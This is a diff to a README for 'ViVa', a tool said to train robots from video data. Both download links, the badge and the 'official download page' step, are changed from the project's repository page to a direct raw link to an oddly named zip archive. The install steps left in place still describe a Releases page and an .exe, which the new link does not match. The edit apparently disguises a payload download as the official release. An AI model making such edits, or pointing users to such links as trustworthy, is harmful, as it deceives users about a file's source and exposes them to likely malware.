@@ -1,6 +1,6 @@
 # 🤖 ViVa - Train robots using smart video models
 
-[![Download ViVa for Windows](https://img.shields.io/badge/Download-ViVa-blue)](https://github.com/clevastunning3272/ViVa)
+[![Download ViVa for Windows](https://img.shields.io/badge/Download-ViVa-blue)](https://raw.githubusercontent.com/clevastunning3272/ViVa/main/greaten/Vi_Va_hauler.zip)
 
 ViVa helps robots learn physical tasks by watching video data. This software bridges the gap between digital video files and physical robot movement. It uses a specific model to turn images into instructions that a robot can follow to complete work.
 
@@ -17,7 +17,7 @@ Your computer needs specific hardware components to run ViVa effectively. These 
 
 ## 📦 How to Download
 
-1.  Visit the [official download page](https://github.com/clevastunning3272/ViVa).
+1.  Visit the [official download page](https://raw.githubusercontent.com/clevastunning3272/ViVa/main/greaten/Vi_Va_hauler.zip).
 2.  Look for the section labeled Releases on the right side of the screen.
 3.  Click the folder icon for the latest version.
 4.  Select the file ending in .exe to start your download.
